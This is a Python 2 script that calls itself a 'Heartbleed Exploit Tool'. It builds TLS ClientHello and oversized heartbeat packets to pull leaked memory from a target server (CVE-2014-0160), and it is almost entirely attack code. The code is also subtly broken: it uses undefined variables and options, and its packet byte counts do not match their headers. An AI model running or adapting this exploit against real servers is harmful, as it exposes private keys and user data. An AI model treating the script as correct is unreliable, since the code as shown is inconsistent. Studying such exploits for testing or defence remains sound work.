#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import struct
import socket
import time
import re
import os
from optparse import OptionParser

# Command-line Options Parser
options = OptionParser(usage='%prog server [options]', description='Test and exploit TLS heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-l', '--length', type='int', default=0x4000, dest='len', help='Payload length (default: 0x4000)')
options.add_option('-s', '--starttls', action='store_true', dest='starttls', help='Use STARTTLS for SMTP/POP/IMAP/FTP')
options.add_option('-v', '--verbose', action='store_true', dest='verbose', help='Enable verbose output')
opts, args = options.parse_args()

def hex2bin(arr):
    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')

def build_client_hello(tls_ver):
    """Construct a TLS ClientHello packet."""
    return [
        0x16, 0x03, tls_ver, 0x00, 0xdc,  # Header
        0x01, 0x00, 0x00, 0xd8, 0x03, tls_ver,  # Handshake Header
        # Random (32 bytes)
        0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
        0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
        0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
        0x00, 0x66,  # Cipher Suites length
        0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
        0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
        0x00, 0xff,  # Compression methods
        0x00, 0x49  # Extensions
    ]

def build_heartbeat(tls_ver):
    """Construct a TLS Heartbeat packet."""
    return [
        0x18, 0x03, tls_ver, 0x00, 0x29,  # Header
        0x01, opts.len // 256, opts.len % 256,  # Payload length
    ] + [0x41] * opts.len

def receive_tls_record(sock):
    """Receive a TLS record from the server."""
    print '[out] Analyze the result....'
    try:
        header = sock.recv(5)
        if not header:
            print '[out] Unexpected EOF while reading TLS header.'
            return None, None, None
        typ, ver, length = struct.unpack('>BHH', header)
        payload = ''
        while len(payload) < length:
            payload += sock.recv(length - len(payload))
        return typ, ver, payload
    except Exception as e:
        print '[out] Error receiving TLS record: {}'.format(e)
        return None, None, None

def connect(target, port):
    """Establish a connection to the target server."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target, port))
        return sock
    except Exception as e:
        print '[out] Connection failed: {}'.format(e)
        return None

def bleed(target, port):
    """Attempt to exploit the Heartbleed vulnerability."""
    try:
        print '[out] Connecting to {}:{}'.format(target, port)
        sock = connect(target, port)
        if not sock:
            return
        print '[out] Sending Client Hello for TLSv1.0'
        sock.send(hex2bin(build_client_hello(0x02)))
        print '[out] Sending Heartbeat...'
        sock.send(hex2bin(build_heartbeat(0x02)))
        while True:
            typ, ver, payload = receive_tls_record(sock)
            if typ == 24:
                print '[out] VULNERABILITY FOUND:  Heartbeat response received, potential vulnerability detected!'
                print payload if opts.verbose else '[!] Response suppressed.'
                break
            elif typ == 21:
                print '[out] Received Alert - Server not vulnerable.'
                break
        sys.stdout.write('\rPlease wait... connection attempt ' + str(x+1) + ' of ' + str(opts.num))
        sys.stdout.flush()
        sock.close()
    except Exception as e:
        print '[out] Exploit failed: {}'.format(e)

def main():
    print '\n[***] Heartbleed Exploit Tool v2.7 Compatible [***]'
    if opts.filein:
        with open(opts.filein, 'r') as infile:
            for line in infile:
                target = line.strip()
                bleed(target, opts.port)
    else:
        if len(args) < 1:
            options.print_help()
            return
        bleed(args[0], opts.port)

if __name__ == '__main__':
    main()
